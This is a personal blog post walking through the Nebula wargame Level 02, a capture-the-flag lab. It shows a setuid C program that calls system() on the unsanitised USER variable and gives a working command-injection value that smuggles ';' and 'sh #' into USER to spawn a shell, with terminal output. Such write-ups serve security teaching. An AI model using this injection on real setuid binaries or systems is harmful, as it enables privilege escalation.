<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      Nebula Level 02
    
  </title>

  <!-- CSS -->
  <link rel="stylesheet" href="/public/css/poole.css">
  <link rel="stylesheet" href="/public/css/syntax.css">
  <link rel="stylesheet" href="/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/public/pic.png">
                                 <link rel="shortcut icon" href="/public/pic.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">

  <!--<link rel="stylesheet" href="/public/css/highlight/styles/monokai.css">
  <script src="/public/css/highlight/highlight.pack.js"></script>
  <script>hljs.initHighlightingOnLoad();</script>-->

</head>


  <body>
  
    <div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <h1>
        <a href="/">
          Álvaro Felipe Melchor
        </a>
      </h1>
      <p class="lead">Stuff about everything</p>
    </div>

    <nav class="sidebar-nav">
      <a class="sidebar-nav-item" href="/">Home</a>

      

      
      
        
          
        
      
        
          
            <a class="sidebar-nav-item" href="/about.html">About</a>
          
        
      
        
          
            <a class="sidebar-nav-item" href="/archive.html">Archive</a>
          
        
      
        
      
        
          
        
      

      <a class="sidebar-nav-item" href="https://github.com/alvarofe">GitHub</a>
    </nav>

    <p>&copy; 2014. All rights reserved.</p>
  </div>
</div>


    <div class="content container">
      <div class="post">
  <h1 class="post-title">Nebula Level 02</h1>
  <span class="post-date">11 Dec 2014</span>
  <p>Today we have to deal with the challenge nebula 02. We should find out the vulnerability in the following snippet.</p>
<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;unistd.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>
<span class="cp">#include &lt;sys/types.h&gt;</span>
<span class="cp">#include &lt;stdio.h&gt;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>

  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>

  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>

  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>

  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;about to call system(</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>

  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<p>The first part of the program remains the same as the challenge in nebula 01. If we look the code carefully we can spot quickly when the problem might arise. If in somehow I can trick the program to execute code when it executes <code>/bin/echo $USER is cool</code> the work is done.</p>

<p>We have to try that once the program get the value of variable <code>USER</code> execute other command. To achieve that we should know a little bit about bash and the solution comes to us quickly.</p>

<p>In bash there is a way to indicate separation between different statements in one line and is using the special character <code>;</code>. We can see how the user does not sanitize the value that returns <code>getenv</code> so it process the meta-characters as normal characters. So to execute an arbitrary program would be enough to do the next.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ USER</span><span class="o">=</span><span class="s2">&quot;level02 ; echo You was pwned ; sh # &quot;</span>
<span class="nv">$ </span>./flag02
about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo level02 ; echo You was pwned ; sh #  is cool&quot;</span><span class="o">)</span>
level02
You was pwned
sh-4.2<span class="err">$</span>
</code></pre></div>
<p>In that way we got a shell. Maybe you are wondering about <code>sh #</code>. That is why without the <code>#</code> the string <code>is cool</code> would be considered as a file so we put <code>#</code> to comment that line. You can try on your own that without <code>#</code> you don’t get the shell.</p>
<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>./flag02
about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo level02 ; echo You was pwned ; sh  is cool&quot;</span><span class="o">)</span>
level02
You was pwned
sh: is: No such file or directory
</code></pre></div>
<p>If you liked this post, you can
<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/nebulalevel02&text=Nebula Level 02&via=alvaro_fe">share it with your followers</a>
or
<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>

</div>

<div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_developer = 1;
    var disqus_shortname = 'codepwn'; // required: replace example with your forum shortname
    
    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>

<div class="related">
  <h2>Related Posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/posts/nebulalevel01">
            Nebula Level 01
            <small>10 Dec 2014</small>
          </a>
        </h3>
      </li>
    
  </ul>
</div>


    </div>

    
<!-- Add Disqus comments. -->
<div id="disqus_thread"></div>
    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'alvarofe'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


    
  </body>
</html>
